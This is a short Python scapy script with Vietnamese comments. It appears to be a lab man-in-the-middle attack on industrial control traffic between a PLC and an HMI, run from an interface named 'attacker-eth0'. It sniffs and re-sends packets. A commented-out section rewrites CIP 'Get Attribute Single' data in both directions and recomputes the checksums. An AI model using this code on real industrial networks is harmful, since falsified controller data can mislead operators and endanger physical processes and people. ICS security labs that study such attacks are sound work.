from scapy.all import *
import os

# Cấu hình địa chỉ IP của các bên
plc_ip = "192.168.1.10"
hmi_ip = "192.168.1.20"

# Hàm sửa đổi gói tin CIP
# def modify_cip_packet(packet):
#     if packet.haslayer("CIP"):
#         cip_layer = packet["CIP"]
#         print(f"Original CIP Data: {cip_layer.show(dump=True)}")
        
#         # Thay đổi nội dung CIP (ví dụ, dữ liệu trả về)
#         if cip_layer.service == 0x4C:  # Service 'Get Attribute Single'
#             cip_layer.CIP_Data = b'\x01\x01'  # Thay đổi nội dung

#         # Tạo lại gói tin
#         del packet[IP].chksum  # Xóa checksum để scapy tự tính lại
#         del packet[TCP].chksum
#         return packet
#     return None

# Hàm xử lý gói tin
def process_packet(packet):
    # Kiểm tra hướng truyền
    # if IP in packet and TCP in packet:
    #     if packet[IP].src == hmi_ip and packet[IP].dst == plc_ip:
    #         # Gói tin đi từ HMI đến PLC
    #         mod_pkt = modify_cip_packet(packet)
    #         if mod_pkt:
    #             send(mod_pkt)  # Gửi gói tin đã chỉnh sửa
    #             return
    #     elif packet[IP].src == plc_ip and packet[IP].dst == hmi_ip:
    #         # Gói tin từ PLC về HMI
    #         mod_pkt = modify_cip_packet(packet)
    #         if mod_pkt:
    #             send(mod_pkt)
    #             return

        # Gửi tiếp các gói tin không phải CIP
    send(packet)

# Chặn và xử lý gói tin
sniff(prn=process_packet, iface="attacker-eth0")
